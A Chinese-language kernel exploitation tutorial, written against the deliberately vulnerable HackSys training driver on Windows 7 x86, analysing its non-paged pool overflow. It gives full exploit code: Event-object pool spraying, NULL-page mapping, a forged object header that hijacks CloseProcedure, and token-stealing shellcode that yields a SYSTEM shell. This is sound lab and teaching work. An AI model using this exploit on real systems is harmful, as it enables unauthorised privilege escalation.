@@ -1,0 +1,469 @@
+## **前言**
+
+窥探Ring0漏洞世界：缓冲区溢出之池溢出
+
+实验环境：
+
+•虚拟机：Windows 7 x86
+
+•物理机：Windows 10 x64
+
+•软件：IDA，Windbg，VS2022
+
+##  **漏洞分析**
+
+本次实验内容是PoolOverflow，IRP分发函数通过跳转表进行跳转，两项之间的控制码相差4，所以本次实验使用的控制码是：0x22200f，漏洞触发代码：
+
+    
+    
+    int __stdcall TriggerBufferOverflowNonPagedPool(void *UserBuffer, unsigned int Size)
+    {
+    PVOID PoolWithTag; // ebx
+    
+    _DbgPrintEx(0x4Du, 3u, "[+] Allocating Pool chunk\n");
+    PoolWithTag = ExAllocatePoolWithTag(NonPagedPool, 0x1F8u, 'kcaH');// 申请非分页池内存
+    if ( PoolWithTag )                           // 申请成功打印相关信息
+    {
+    _DbgPrintEx(0x4Du, 3u, "[+] Pool Tag: %s\n", "'kcaH'");
+    _DbgPrintEx(0x4Du, 3u, "[+] Pool Type: %s\n", "NonPagedPool");
+    _DbgPrintEx(0x4Du, 3u, "[+] Pool Size: 0x%zX\n", 0x1F8u);
+    _DbgPrintEx(0x4Du, 3u, "[+] Pool Chunk: 0x%p\n", PoolWithTag);
+    ProbeForRead(UserBuffer, 0x1F8u, 1u);       // 确保输入参数地址可读
+    _DbgPrintEx(0x4Du, 3u, "[+] UserBuffer: 0x%p\n", UserBuffer);
+    _DbgPrintEx(0x4Du, 3u, "[+] UserBuffer Size: 0x%zX\n", Size);
+    _DbgPrintEx(0x4Du, 3u, "[+] KernelBuffer: 0x%p\n", PoolWithTag);
+    _DbgPrintEx(0x4Du, 3u, "[+] KernelBuffer Size: 0x%zX\n", 0x1F8u);
+    _DbgPrintEx(0x4Du, 3u, "[+] Triggering Buffer Overflow in NonPagedPool\n");
+    memcpy(PoolWithTag, UserBuffer, Size);      // 复制输入参数到申请的内存里
+    _DbgPrintEx(0x4Du, 3u, "[+] Freeing Pool chunk\n");
+    _DbgPrintEx(0x4Du, 3u, "[+] Pool Tag: %s\n", "'kcaH'");
+    _DbgPrintEx(0x4Du, 3u, "[+] Pool Chunk: 0x%p\n", PoolWithTag);
+    ExFreePoolWithTag(PoolWithTag, 'kcaH');     // 释放内存
+    return 0;
+    }
+    else
+    {
+    _DbgPrintEx(0x4Du, 3u, "[-] Unable to allocate Pool chunk\n");
+    return 0xC0000017;
+    }
+    }
+
+乍看之下好像没啥问题，填充缓冲区，同时也限制大小了，仔细一看，emmm，申请内存的大小是0x1F8字节，复制的时候复制大小来自用户输入，是个经典的缓冲区溢出，不过缓冲区是位于非分页池内存。
+
+##  **漏洞利用**
+
+### 池风水
+
+内核池类似于用户层的堆，也是用来动态分配内存的。因为是动态分配，所以分配的内存位置就会不固定，在用户层有堆喷射这样的技术来辅助突破动态地址，这里则需要在内核里也找到一种方法来修改内存池，以便在内存区域精准调用shellcode。
+
+本例中的程序将用户缓冲区分配在了非分页内存池里，所以需要找到一种方法对非分页池中的地址进行操作以便辅助定位shellcode的执行。
+
+Windows提供了一种Event对象，存储在非分页池中，使用API-CreateEventA创建。
+
+根据参考资料[2]中论文的介绍，我们可知：
+
+内核池空闲池块保存在一个链表结构里，当进行申请该池的内存的时候，会从链表里找到合适大小的池块进行分配，如果找不到，则会寻找相近大小的池块进行切割然后再分配；
+
+当空闲链表里有位置相邻的空闲池块，则会进行合并操作，合并成一个大的池块。
+
+通过大量申请Event对象，然后通过CloseHandle释放一部分Event对象留出合适的空间给用户缓冲区，那么用户缓冲区很可能就会出现在我们挖出的空缺位置上，并且同时紧紧挨着一个Event对象，也就是说，可以固定让用户缓冲区后面紧挨着一个Event对象。
+
+这里需要创建两个足够大的Event对象数组，一个用来消耗小尺寸空闲内存块，一个用来挖出空缺提供给用户缓冲区。
+
+在空出的空闲块中，我们将有漏洞的用户缓冲区插入。
+
+图示如下：（参考资料[7]）
+
+![](https://image.3001.net/images/20220715/1657886736_62d158102291d1f66e64b.png!small)
+
+###  **利用原理 &Event对象结构**
+
+这里的利用方式与之前的堆溢出覆盖堆块链表指针不同，这里通过伪造对象结构来通过堆溢出利用伪造的对象进行执行shellcode（一句话概括：控制缓冲区紧挨着一个Event对象，通过覆盖伪造一个OBJECT_TYPE头，覆盖指向OBJECT_TYPE_INITIALIZER中的一个过程的指针，通过执行该过程从而执行shellcode）具体分析往下看即可。
+
+先给一个刚好大小的正常输入看看池的情况：
+
+    
+    
+    #include
+    #include
+    int main()
+    {
+    ULONG UserBufferSize = 0x1f8;
+    char* UserBuffer = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, UserBufferSize);
+    RtlFillMemory(UserBuffer, UserBufferSize, 0x66);
+    
+    HANDLE hDevice = ::CreateFileW(L"\\\\.\\HacksysExtremeVulnerableDriver", GENERIC_ALL, FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr);
+    
+    ULONG WriteRet = 0;
+    DeviceIoControl(hDevice, 0x222003 + 4 * 3, (LPVOID)UserBuffer, UserBufferSize, NULL, 0, &WriteRet, NULL);
+    
+    HeapFree(GetProcessHeap(), 0, (LPVOID)UserBuffer);
+    
+    return 0;
+    }
+
+给内核漏洞函数下断点，执行到分配缓冲区结束，查看池信息：
+
+![](https://image.3001.net/images/20220715/1657886736_62d15810ee867eaaa54fa.png!small)
+
+一共分配了0x1f8 + 0x8 =
+0x200字节的空间（那8字节是32位池头大小），填充满内容则会紧接着下一个池块头，如果发生溢出，就会覆盖到下一个池块。
+
+因为可以控制的是溢出到的下一个池块必是一个Event对象结构，先操纵用户缓冲区在Event对象结构之前，然后定位该Event对象进行查看。
+
+CreateEventAPI创建的Event对象大小是40个字节，正好匹配池的0x200字节大小，大量喷射Event对象，然后释放其中8个刚好容纳缓冲区，代码：
+
+    
+    
+    #include
+    #include
+    int main()
+    {
+    ULONG UserBufferSize = 0x1f8;
+    char* UserBuffer = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, UserBufferSize);
+    RtlFillMemory(UserBuffer, UserBufferSize, 0x66);
+    
+    HANDLE hDevice = ::CreateFileW(L"\\\\.\\HacksysExtremeVulnerableDriver", GENERIC_ALL, FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr);
+    
+    HANDLE spray_event1[10000] = { 0 };
+    HANDLE spray_event2[5000] = { 0 };
+    for (size_t i = 0; i < 9999; i++)
+    {
+    spray_event1[i] = CreateEventA(NULL, FALSE, FALSE, NULL);
+    }
+    for (size_t i = 0; i < 4999; i++)
+    {
+    spray_event2[i] = CreateEventA(NULL, FALSE, FALSE, NULL);
+    }
+    for (size_t i = 0; i < 8; i++)
+    {
+    CloseHandle(spray_event1[i]);
+    }
+    
+    
+    ULONG WriteRet = 0;
+    DeviceIoControl(hDevice, 0x222003 + 4 * 3, (LPVOID)UserBuffer, UserBufferSize, NULL, 0, &WriteRet, NULL);
+    
+    HeapFree(GetProcessHeap(), 0, (LPVOID)UserBuffer);
+    
+    return 0;
+    }
+
+查看池信息：
+
+![](https://image.3001.net/images/20220715/1657886737_62d15811b59de8807b1db.png!small)
+
+这里已经成功将缓冲区分配到了我面大量申请的内存的空隙中，可以看到这里紧挨着下一个池块：
+
+![](https://image.3001.net/images/20220715/1657886738_62d158126b5c86f1eb6ae.png!small)
+
+接下来查看一下下一个池块的信息：
+
+    
+    
+    // 池块头部
+    kd> dt nt!_POOL_HEADER 0x8685b708+1f8
+    +0x000 PreviousSize     : 0y001000000 (0x40)
+    +0x000 PoolIndex        : 0y0000000 (0)
+    +0x002 BlockSize        : 0y000001000 (0x8)
+    +0x002 PoolType         : 0y0000010 (0x2)
+    +0x000 Ulong1           : 0x4080040      // 池块头部
+    +0x004 PoolTag          : 0xee657645     // 池块头部
+    +0x004 AllocatorBackTraceIndex : 0x7645
+    +0x006 PoolTagHash      : 0xee65
+    
+    // 对象头配额信息
+    kd> dt nt!_OBJECT_HEADER_QUOTA_INFO 0x8685b708+1f8+8
+    +0x000 PagedPoolCharge  : 0
+    +0x004 NonPagedPoolCharge : 0x40     // 非分页池
+    +0x008 SecurityDescriptorCharge : 0
+    +0x00c SecurityDescriptorQuotaBlock : (null)
+    
+    // 对象头部
+    kd> dt nt!_OBJECT_HEADER 0x8685b708+1f8+18
+    +0x000 PointerCount     : 0n1
+    +0x004 HandleCount      : 0n1
+    +0x004 NextToFree       : 0x00000001 Void
+    +0x008 Lock             : _EX_PUSH_LOCK
+    +0x00c TypeIndex        : 0xc ''     // 索引
+    +0x00e InfoMask         : 0x8 ''
+    +0x00f Flags            : 0 ''
+    +0x010 ObjectCreateInfo : 0x8799cd80 _OBJECT_CREATE_INFORMATION
+    +0x010 QuotaBlockCharged : 0x8799cd80 Void
+    +0x014 SecurityDescriptor : (null)
+    +0x018 Body             : _QUAD
+
+这里的TypeIndex实际上是一个指针数组的偏移量大小，这个数组定义了每个对象的OBJECT_TYPE：
+
+![](https://image.3001.net/images/20220715/1657886738_62d15812ec0e51357a27e.png!small)
+
+  
+
+查看对象类型：
+
+> kd> dt nt!_OBJECT_TYPE 865f59c8  
+> +0x000 TypeList : _LIST_ENTRY [ 0x865f59c8 - 0x865f59c8 ]  
+> +0x008 Name : _UNICODE_STRING "Event"  
+> +0x010 DefaultObject : (null)  
+> +0x014 Index : 0xc ''  
+> +0x018 TotalNumberOfObjects : 0x4a14  
+> +0x01c TotalNumberOfHandles : 0x4a8a  
+> +0x020 HighWaterNumberOfObjects : 0x4a19  
+> +0x024 HighWaterNumberOfHandles : 0x4a8f  
+> +0x028 TypeInfo : _OBJECT_TYPE_INITIALIZER  
+> +0x078 TypeLock : _EX_PUSH_LOCK  
+> +0x07c Key : 0x6e657645  
+> +0x080 CallbackList : _LIST_ENTRY [ 0x865f5a48 - 0x865f5a48 ]
+>
+> 对象类型名称是Event事件对象，TypeInfo类型信息：
+>
+> kd> dx -id 0,0,881fc560 -r1 (*((ntkrpamp!_OBJECT_TYPE_INITIALIZER
+> *)0x865f59f0))  
+> (*((ntkrpamp!_OBJECT_TYPE_INITIALIZER *)0x865f59f0))[Type:
+> _OBJECT_TYPE_INITIALIZER]  
+> [+0x000] Length : 0x50 [Type: unsigned short]  
+> [+0x002] ObjectTypeFlags : 0x0 [Type: unsigned char]  
+> [+0x002 ( 0: 0)] CaseInsensitive : 0x0 [Type: unsigned char]  
+> [+0x002 ( 1: 1)] UnnamedObjectsOnly : 0x0 [Type: unsigned char]  
+> [+0x002 ( 2: 2)] UseDefaultObject : 0x0 [Type: unsigned char]  
+> [+0x002 ( 3: 3)] SecurityRequired : 0x0 [Type: unsigned char]  
+> [+0x002 ( 4: 4)] MaintainHandleCount : 0x0 [Type: unsigned char]  
+> [+0x002 ( 5: 5)] MaintainTypeList : 0x0 [Type: unsigned char]  
+> [+0x002 ( 6: 6)] SupportsObjectCallbacks : 0x0 [Type: unsigned char]  
+> [+0x004] ObjectTypeCode : 0x2 [Type: unsigned long]  
+> [+0x008] InvalidAttributes : 0x100 [Type: unsigned long]  
+> [+0x00c] GenericMapping [Type: _GENERIC_MAPPING]  
+> [+0x01c] ValidAccessMask : 0x1f0003 [Type: unsigned long]  
+> [+0x020] RetainAccess : 0x0 [Type: unsigned long]  
+> [+0x024] PoolType : NonPagedPool (0) [Type: _POOL_TYPE]  
+> [+0x028] DefaultPagedPoolCharge : 0x0 [Type: unsigned long]  
+> [+0x02c] DefaultNonPagedPoolCharge : 0x40 [Type: unsigned long]  
+> [+0x030] DumpProcedure : 0x0 : 0x0 [Type: void (*)(void
+> *,_OBJECT_DUMP_CONTROL *)]  
+> [+0x034] OpenProcedure : 0x0 : 0x0 [Type: long
+> (*)(_OB_OPEN_REASON,char,_EPROCESS *,void *,unsigned long *,unsigned long)]  
+> [+0x038] CloseProcedure : 0x0 : 0x0 [Type: void (*)(_EPROCESS *,void
+> *,unsigned long,unsigned long)]  
+> [+0x03c] DeleteProcedure : 0x0 : 0x0 [Type: void (*)(void *)]  
+> [+0x040] ParseProcedure : 0x0 : 0x0 [Type: long (*)(void *,void
+> *,_ACCESS_STATE *,char,unsigned long,_UNICODE_STRING *,_UNICODE_STRING
+> *,void *,_SECURITY_QUALITY_OF_SERVICE *,void * *)]  
+> [+0x044] SecurityProcedure : 0x840ab5b6 :
+> ntkrpamp!_SeDefaultObjectMethod@36+0x0 [Type: long (*)(void
+> *,_SECURITY_OPERATION_CODE,unsigned long *,void *,unsigned long *,void *
+> *,_POOL_TYPE,_GENERIC_MAPPING *,char)]  
+> [+0x048] QueryNameProcedure : 0x0 : 0x0 [Type: long (*)(void *,unsigned
+> char,_OBJECT_NAME_INFORMATION *,unsigned long,unsigned long *,char)]  
+> [+0x04c] OkayToCloseProcedure : 0x0 : 0x0 [Type: unsigned char (*)(_EPROCESS
+> *,void *,void *,char)]
+
+可以看到这个结构里面后面有一些函数指针，我们可以从提供的程序中挑选以供自己使用，这里选择0x38的CloseProcedure，这个函数会在对象被释放的时候调用，偏移为：0x28+0x38
+= 0x60，覆盖这个指针，指向shellcode，然后释放对象，就会调用该方法，从而执行shellcode
+
+那么，我们的目标就是把TypeIndex的偏移量从0xc改成0x0，第一个指针是空指针，不被使用的，在Windows7中有一个漏洞，可以调用NtAllocateVirtualMemory来映射到NULL页面，然后覆盖0x60处的指针，指向shellcode地址，完成溢出覆盖，然后接下来只需要释放这个对象，即可完成利用
+
+###  **编写EXP**
+
+完整利用代码如下（以删去一些不必要的打印以免看着乱）：
+
+    
+    
+    #include
+    #include
+    
+    typedef NTSTATUS(WINAPI* NtAllocateVirtualMemory_t)(IN HANDLEProcessHandle,
+    IN OUT PVOID* BaseAddress,
+    IN ULONG      ZeroBits,
+    IN OUT PULONG AllocationSize,
+    IN ULONG      AllocationType,
+    IN ULONG      Protect);
+    
+    
+    // Windows 7 SP1 x86 Offsets
+    #define KTHREAD_OFFSET     0x124 // nt!_KPCR.PcrbData.CurrentThread
+    #define EPROCESS_OFFSET    0x050 // nt!_KTHREAD.ApcState.Process
+    #define PID_OFFSET         0x0B4 // nt!_EPROCESS.UniqueProcessId
+    #define FLINK_OFFSET       0x0B8 // nt!_EPROCESS.ActiveProcessLinks.Flink
+    #define TOKEN_OFFSET       0x0F8 // nt!_EPROCESS.Token
+    #define SYSTEM_PID         0x004 // SYSTEM Process PID
+    
+    VOID TokenStealingPayloadWin7() {
+    // Importance of Kernel Recovery
+    __asm {
+    pushad
+    
+    ;获取当前进程EPROCESS
+    xor eax, eax
+    mov eax, fs: [eax + KTHREAD_OFFSET]
+    mov eax, [eax + EPROCESS_OFFSET]
+    mov ecx, eax
+    
+    ;搜索system进程EPROCESS
+    mov edx, SYSTEM_PID
+    SearchSystemPID :
+    mov eax, [eax + FLINK_OFFSET]
+    sub eax, FLINK_OFFSET
+    cmp[eax + PID_OFFSET], edx
+    jne SearchSystemPID
+    
+    token窃取
+    mov edx, [eax + TOKEN_OFFSET]
+    mov[ecx + TOKEN_OFFSET], edx
+    
+    环境还原 + 返回
+    popad
+    mov eax,1
+    }
+    }
+    
+    BOOL MapNullPage() {
+    HMODULE hNtdll;
+    SIZE_T RegionSize = 0x1000;           // will be rounded up to the next host
+    // page size address boundary -> 0x2000
+    
+    PVOID BaseAddress = (PVOID)0x00000001; // will be rounded down to the next host
+                                         // page size address boundary -> 0x00000000
+    
+    hNtdll = GetModuleHandle(L"ntdll.dll");
+    
+    // Grab the address of NtAllocateVirtualMemory
+    NtAllocateVirtualMemory_t    NtAllocateVirtualMemory;
+    NtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
+    
+    
+    // Allocate the Virtual memory
+    NtAllocateVirtualMemory((HANDLE)0xFFFFFFFF,
+    &BaseAddress,
+    0,
+    &RegionSize,
+    MEM_RESERVE | MEM_COMMIT | MEM_TOP_DOWN,
+    PAGE_EXECUTE_READWRITE);
+    
+    FreeLibrary(hNtdll);
+    
+    return TRUE;
+    }
+    
+    int main()
+    {
+    
+    ULONG UserBufferSize = 0x1f8+40;
+    PVOID EopPayload = &ampTokenStealingPayloadWin7
+    
+    HANDLE hDevice = ::CreateFileW(L"\\\\.\\HacksysExtremeVulnerableDriver", GENERIC_ALL, FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr);
+    
+    char* UserBuffer = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, UserBufferSize);
+    
+    // 溢出覆盖一整个Event对象
+    RtlFillMemory(UserBuffer, UserBufferSize, 0x66);
+    PVOID Memory = NULL;
+    Memory = (PVOID)((ULONG)UserBuffer + 0x1f8);
+    *(PULONG)Memory = (ULONG)0x04080040;
+    Memory = (PVOID)((ULONG)Memory + 0x4);
+    *(PULONG)Memory = (ULONG)0xee657645;
+    Memory = (PVOID)((ULONG)Memory + 0x4);
+    *(PULONG)Memory = (ULONG)0x00000000;
+    Memory = (PVOID)((ULONG)Memory + 0x4);
+    *(PULONG)Memory = (ULONG)0x00000040;
+    Memory = (PVOID)((ULONG)Memory + 0x4);
+    *(PULONG)Memory = (ULONG)0x00000000;
+    Memory = (PVOID)((ULONG)Memory + 0x4);
+    *(PULONG)Memory = (ULONG)0x00000000;
+    Memory = (PVOID)((ULONG)Memory + 0x4);
+    *(PULONG)Memory = (ULONG)0x00000001;
+    Memory = (PVOID)((ULONG)Memory + 0x4);
+    *(PULONG)Memory = (ULONG)0x00000001;
+    Memory = (PVOID)((ULONG)Memory + 0x4);
+    *(PULONG)Memory = (ULONG)0x00000000;
+    Memory = (PVOID)((ULONG)Memory + 0x4);
+    *(PULONG)Memory = (ULONG)0x00080000;
+    
+    // 映射Null页面，设置指针
+    MapNullPage();
+    *(PULONG)0x00000060 = (ULONG)EopPayload;
+    
+    // 池喷射
+    HANDLE spray_event1[10000] = { 0 };
+    HANDLE spray_event2[5000] = { 0 };
+    for (size_t i = 0; i < 10000; i++)
+    {
+    spray_event1[i] = CreateEventA(NULL, FALSE, FALSE, NULL);
+    }
+    for (size_t i = 0; i < 5000; i++)
+    {
+    spray_event2[i] = CreateEventA(NULL, FALSE, FALSE, NULL);
+    }
+    
+    // 制造空缺
+    for (size_t i = 0; i < 5000; i+=16)
+    {
+    for (size_t j = 0; j < 8; j++)
+    {
+    CloseHandle(spray_event2[i + j]);
+    }
+    }
+    
+    // 触发溢出覆盖
+    ULONG WriteRet = 0;
+    DeviceIoControl(hDevice, 0x222003 + 4 * 3, (LPVOID)UserBuffer, UserBufferSize, NULL, 0, &WriteRet, NULL);
+    
+    HeapFree(GetProcessHeap(), 0, (LPVOID)UserBuffer);
+    UserBuffer = NULL;
+    
+    // 释放多余的对象
+    for (size_t i = 0; i < 10000; i++)
+     {
+    CloseHandle(spray_event1[i]);
+    }
+    
+    for (size_t i = 8; i < 5000; i += 16)
+    {
+    for (size_t j = 0; j < 8; j++)
+    {
+    CloseHandle(spray_event2[i + j]);
+    }
+    }
+    
+    system("pause");
+    system("cmd.exe");
+    
+    return 0;
+    }
+
+###  **效果截图**
+
+![](https://image.3001.net/images/20220715/1657886739_62d158137c1fbf7a66c1a.png!small)
+
+##  **参考资料**
+
+• [1] FuzzySecurity | Windows ExploitDev: Part 16
+https://www.fuzzysecurity.com/tutorials/expDev/20.html
+
+• [2] kernelpool-exploitation.pdf (packetstormsecurity.net)
+https://dl.packetstormsecurity.net/papers/general/kernelpool-exploitation.pdf
+
+• [3] Understanding Pool Corruption Part 1 – Buffer Overflows | Microsoft Docs
+
+https://docs.microsoft.com/zh-cn/archive/blogs/ntdebugging/understanding-pool-corruption-part-1-buffer-overflows
+
+• [4] Understanding Pool Corruption Part 2 – Special Pool for Buffer Overruns
+| Microsoft Docs
+
+https://docs.microsoft.com/zh-cn/archive/blogs/ntdebugging/understanding-pool-corruption-part-2-special-pool-for-buffer-overruns
+
+• [5] Understanding Pool Corruption Part 3 – Special Pool for Double Frees |
+Microsoft Docs
+
+https://docs.microsoft.com/zh-cn/archive/blogs/ntdebugging/understanding-pool-corruption-part-3-special-pool-for-double-frees
+
+• [6] [翻译]Windows内核漏洞学习-内核池攻击原理_Wwoc的博客-CSDN博客
+
+https://blog.csdn.net/qq_38025365/article/details/106291907
+
+• [7] [翻译]# Windows 内核 利用教程 4 池风水 -> 池溢出-外文翻译-看雪论坛-安全社区|安全招聘|bbs.pediy.com
+https://bbs.pediy.com/thread-223719.htm
+
+• [8] CreateEventA function (synchapi.h) - Win32 apps | Microsoft Docs
+
+https://docs.microsoft.com/zh-cn/windows/win32/api/synchapi/nf-synchapi-createeventa?redirectedfrom=MSDN
+
